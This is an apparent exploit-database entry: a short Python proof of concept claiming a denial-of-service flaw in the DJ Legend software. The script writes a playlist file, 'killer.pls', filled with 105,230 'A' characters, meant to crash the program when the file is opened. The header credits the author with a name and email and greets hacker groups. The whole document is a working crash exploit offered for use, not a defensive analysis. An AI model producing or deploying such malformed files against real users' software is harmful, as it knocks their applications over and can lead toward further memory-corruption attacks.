#Exploit Title :DJ Legend Denial of Service Vulnerability
#Software : DJ Legend
#Software link : http://software-files-l.cnet.com/s/software/11/01/29/39/DJLegendTrial_601.exe?e=1287193960&h=2175e25785f74d3d13e14f7b93f3d94f&lop=link&ptype=1901&ontid=18502&siteId=4&edId=3&spi=1b1509d696a5851e6b5d4f3269c5a9af&pid=11012939&psid=10904364&fileName=DJLegendTrial_601.exe
#Autor : ABDI MOHAMED
#Email : abdimohamed@hotmail.fr
#greetz: net_own3r , sadhacker , net-decrypt3r , xa7m3d , mr.fearfactor and all tunisian hackers
#Software version : n/a
#Tested on : Win7 Ultimate fr
#!/usr/bin/python
outfile="killer.pls"
junk="\x41" * 105230
FILE=open(outfile, "w")
FILE.write(junk)
FILE.close()
print "[+] File created succesufully , [+]"